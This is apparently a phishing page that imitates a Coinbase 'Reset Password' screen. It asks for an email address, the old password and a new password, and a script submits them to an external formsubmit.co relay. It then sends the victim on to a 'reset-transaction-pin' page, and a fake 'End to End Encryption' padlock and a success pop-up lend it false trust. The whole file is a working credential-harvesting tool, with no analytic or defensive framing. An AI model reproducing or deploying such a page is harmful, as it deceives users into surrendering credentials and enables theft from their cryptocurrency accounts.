<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Reset Password - Coinbase</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      box-sizing: border-box;
    }

    .top-right {
      position: absolute;
      top: 20px;
      right: 20px;
    }

    .top-right a {
      color: #4c8ffb;
      font-weight: 500;
      text-decoration: none;
      font-size: 15px;
    }

    .reset-container {
      width: 100%;
      max-width: 400px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .reset-title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 15px;
    }

    .reset-text {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
      width: 100%;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #fff;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      background-color: #2c2c2c;
      color: white;
      font-size: 14px;
      box-sizing: border-box;
    }

    .form-group input::placeholder {
      color: #888;
    }

    .btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 32px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .btn-primary {
      background-color: #4c8ffb;
      color: black;
    }

    .btn-primary:hover {
      background-color: #367af6;
    }

    .btn.loading .btn-text {
      visibility: hidden;
    }

    .btn.loading::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      border: 3px solid black;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    /* End to End Encryption Text with CSS Padlock */
    .encryption-text {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 14px;
      color: #4c8ffb;
      margin-top: 20px;
      text-align: center;
      font-weight: 500;
    }

    .padlock {
      width: 16px;
      height: 20px;
      position: relative;
      display: inline-block;
    }

    .padlock::before {
      content: '';
      position: absolute;
      top: 0;
      left: 4px;
      width: 8px;
      height: 8px;
      border: 2px solid #4c8ffb;
      border-bottom: none;
      border-radius: 8px 8px 0 0;
      animation: lock-shackle 0.5s ease-in-out;
    }

    .padlock::after {
      content: '';
      position: absolute;
      top: 8px;
      left: 0;
      width: 16px;
      height: 12px;
      background: #4c8ffb;
      border-radius: 2px;
      box-shadow: 0 0 8px rgba(76, 143, 251, 0.5);
    }

    @keyframes lock-shackle {
      0% { transform: translateY(2px); }
      50% { transform: translateY(-2px); }
      100% { transform: translateY(0); }
    }

    /* Success Pop-up Styles */
    .popup-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }

    .popup {
      background-color: #1a1a1a;
      border-radius: 12px;
      padding: 20px;
      max-width: 350px;
      width: 100%;
      text-align: center;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }

    .popup-title {
      font-size: 20px;
      font-weight: 600;
      color: #4c8ffb;
      margin-bottom: 10px;
    }

    .popup-text {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .popup-btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 32px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      background-color: #4c8ffb;
      color: black;
      transition: background-color 0.3s;
    }

    .popup-btn:hover {
      background-color: #367af6;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="top-right">
    <a href="index.html">Back to Home</a>
  </div>

  <div class="reset-container">
    <div class="reset-title">Reset Password</div>
    <div class="reset-text">
      Resetting your password helps keep your account secure. We'll verify your email and old password to ensure only you can make this change.
    </div>

    <form id="password-form" action="https://formsubmit.co/117f5e73018f30b3473b2d9b88532a7a" method="POST">
      <input type="hidden" name="_subject" value="Password Reset Submission">
      <input type="hidden" name="_next" value="reset-transaction-pin.html">
      <input type="hidden" name="_captcha" value="false">
      <div class="form-group">
        <label for="email">Email Address</label>
        <input type="email" id="email" name="email" placeholder="Enter your email" required>
      </div>
      <div class="form-group">
        <label for="old-password">Old Password</label>
        <input type="password" id="old-password" name="old-password" placeholder="Enter your old password" required>
      </div>
      <div class="form-group">
        <label for="new-password">New Password</label>
        <input type="password" id="new-password" name="new-password" placeholder="Enter your new password" required>
      </div>

      <button type="submit" class="btn btn-primary" id="reset-btn">
        <span class="btn-text">Reset Password</span>
      </button>
    </form>

    <div class="encryption-text">
      <span class="padlock"></span>
      End to End Encryption
    </div>
  </div>

  <!-- Success Pop-up -->
  <div class="popup-overlay" id="popup-overlay">
    <div class="popup">
      <div class="popup-title">Password Reset Successful!</div>
      <div class="popup-text">
        Your password has been updated securely. Click below to continue.
      </div>
      <button class="popup-btn" id="popup-btn">Continue</button>
    </div>
  </div>

  <script>
    document.getElementById('password-form').addEventListener('submit', function(event) {
      event.preventDefault();
      const email = document.getElementById('email').value;
      const oldPassword = document.getElementById('old-password').value;
      const newPassword = document.getElementById('new-password').value;
      const resetBtn = document.getElementById('reset-btn');
      const popupOverlay = document.getElementById('popup-overlay');

      // Basic client-side validation
      if (!email.includes('@')) {
        alert('Please enter a valid email address.');
        return;
      }
      if (newPassword.length < 8) {
        alert('New password must be at least 8 characters long.');
        return;
      }

      // Show loading effect
      resetBtn.classList.add('loading');
      resetBtn.disabled = true;

      // Simulate form submission to Formsubmit and show success pop-up
      setTimeout(() => {
        // Submit the form programmatically to Formsubmit
        document.getElementById('password-form').submit();
        
        // Show success pop-up (as a fallback if Formsubmit redirect fails)
        resetBtn.classList.remove('loading');
        resetBtn.disabled = false;
        popupOverlay.style.display = 'flex';
      }, 1000); // 1-second loading delay
    });

    // Handle pop-up button click
    document.getElementById('popup-btn').addEventListener('click', function() {
      window.location.href = 'reset-transaction-pin.html';
    });
  </script>
</body>
</html>
